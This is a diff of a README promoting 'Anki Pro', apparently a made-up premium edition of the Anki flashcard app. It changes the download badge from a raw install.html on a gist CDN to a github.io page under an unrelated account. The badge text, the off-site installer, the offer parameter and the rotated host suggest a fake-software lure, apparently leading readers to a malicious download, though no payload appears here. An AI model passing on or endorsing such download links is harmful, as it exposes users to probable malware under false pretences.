@@ -3,7 +3,7 @@
 **Anki Pro** is an enhanced version of the legendary flashcard app designed for deep learning and long-term memory retention.  
 Available for **macOS** and **Windows**, it uses scientifically proven spaced-repetition algorithms to help you study faster and remember longer. 🎓  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Anki%20Pro-1976D2?style=for-the-badge&logo=github&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/bethovensmalldoll/cd1492f49b355d0a4940387e2d8a61b5/raw/f411914cc064a3ac2fed0766ac86da700a7d5e50/install.html?offer=AnkiPro)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Anki%20Pro-1976D2?style=for-the-badge&logo=github&logoColor=white&labelColor=0B0F19)](https://desk-app-git.github.io/.github/?offer=AnkiPro)
 
 ---
 
